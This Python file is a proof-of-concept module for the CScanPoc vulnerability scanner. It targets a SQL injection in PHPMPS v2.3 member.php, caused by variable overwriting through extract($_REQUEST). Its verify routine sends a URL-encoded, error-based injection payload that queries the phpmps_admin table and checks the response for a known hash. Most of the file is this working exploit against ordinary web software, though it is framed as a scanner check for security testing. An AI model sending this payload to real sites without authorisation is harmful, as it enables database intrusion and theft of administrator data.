# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPMPS_0002'  # 平台漏洞编号，留空
    name = 'PHPMPS v2.3 member.php 422 - 455 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-01'  # 漏洞公布时间
    desc = '''
        php分类信息发布系统是一款免费开源的分类信息程序,适用于建立本地信息站点。
        member.php 422 - 455 行的代码使用了extract($_REQUEST);
        导致我们可以覆盖任意变量，通过覆盖变量$table可以构造注入。
        /phpmps/member.php?act=check_info_gold&table=phpmps_member
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1464/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMPS'  # 漏洞应用名称
    product_version = 'v2.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '83948032-e8b9-4691-b5c5-bb63cffdbbd5'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/phpmps/member.php?act=check_info_gold&table=phpmps_member'
            data = "%20where%201=1%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28select%20md5(c)%20from%20phpmps_admin%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23"
            url = self.target + payload + data
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
